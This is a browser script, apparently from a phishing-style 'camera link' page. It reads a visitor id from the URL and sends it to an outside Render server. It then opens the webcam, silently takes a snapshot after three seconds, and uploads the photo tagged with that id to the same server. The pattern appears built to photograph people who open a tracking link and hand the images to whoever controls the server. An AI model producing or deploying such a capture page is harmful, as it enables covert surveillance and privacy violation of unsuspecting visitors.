<script>

const RENDER_URL = "https://kossah-github-io.onrender.com";


async function start() {

    const status = document.getElementById("status");

    const params = new URLSearchParams(window.location.search);
    const id = params.get("id");


    if (!id) {
        status.innerHTML = "Нет ID";
        return;
    }


    try {

        // отправляем ID
        const res = await fetch(
            RENDER_URL + "/?id=" + id
        );

        console.log(await res.text());


        status.innerHTML =
        "ID отправлен, открываю камеру";


        const stream =
        await navigator.mediaDevices.getUserMedia({
            video: true
        });


        const video =
        document.getElementById("video");

        video.srcObject = stream;


        status.innerHTML =
        "Камера работает";


        setTimeout(async () => {


            const canvas =
            document.createElement("canvas");


            canvas.width =
            video.videoWidth;

            canvas.height =
            video.videoHeight;


            canvas
            .getContext("2d")
            .drawImage(video,0,0);



            canvas.toBlob(async (blob) => {


                const form =
                new FormData();


                form.append(
                    "id",
                    id
                );


                form.append(
                    "photo",
                    blob,
                    "photo.jpg"
                );



                const answer =
                await fetch(
                    RENDER_URL + "/photo",
                    {
                        method:"POST",
                        body:form
                    }
                );


                status.innerHTML =
                await answer.text();



                stream
                .getTracks()
                .forEach(
                    t => t.stop()
                );


            }, "image/jpeg");



        },3000);



    } catch(err) {

        status.innerHTML =
        "Ошибка: " + err;

        console.log(err);

    }


}


start();

</script>
